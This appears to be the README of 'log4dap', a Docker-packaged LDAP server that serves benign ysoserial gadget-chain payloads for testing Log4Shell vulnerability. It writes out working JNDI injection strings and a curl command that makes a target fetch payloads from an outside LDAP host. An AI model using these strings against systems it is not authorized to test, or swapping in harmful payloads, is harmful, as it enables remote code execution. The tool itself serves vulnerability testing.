## Description

A simple java LDAP host that will respond with a benign jdk11+ exploitable gadget chain payload. Useful for generating exploit logs, and testing if your services are vulnerable to a set of well-known follow-up gadget chains that are needed to exploit this vulnerability on newer jdk versions.

### Payloads

The pre-packaged exploit payloads simply run `touch /<payload name>.txt`, e.g. `touch /CommonsCollections6.txt` on the target. They were generated with [ysoserial](https://github.com/frohoff/ysoserial).

## Build
docker-compose build

## Run
docker-compose up

## Usage

1. Pick a payload from the list of gadget chains available in [ysoserial](https://github.com/frohoff/ysoserial).
2. Build your exploit string with your ldap host's IP and the name of the ysoserial payload you wish to use, if any
   * `${jndi:ldap://<host.ip.address>:1337/[gadget chain payload>]`
   * `${jndi:ldap://192.168.1.5:1337/CommonsCollections6}`
3. Use any of the many mechanisms at your disposal to attempt to trigger the log4shell exploit with that string. log4dap will display an error, but the fact you know the target attempted to load a class tells you you're vulnerable.

#### Example
`curl  -H '<some-header or other property you're testing> : ${jndi:ldap://<host.ip.address>:1337/<gadget chain payload>}' http://target.hostname/some/endpoint`
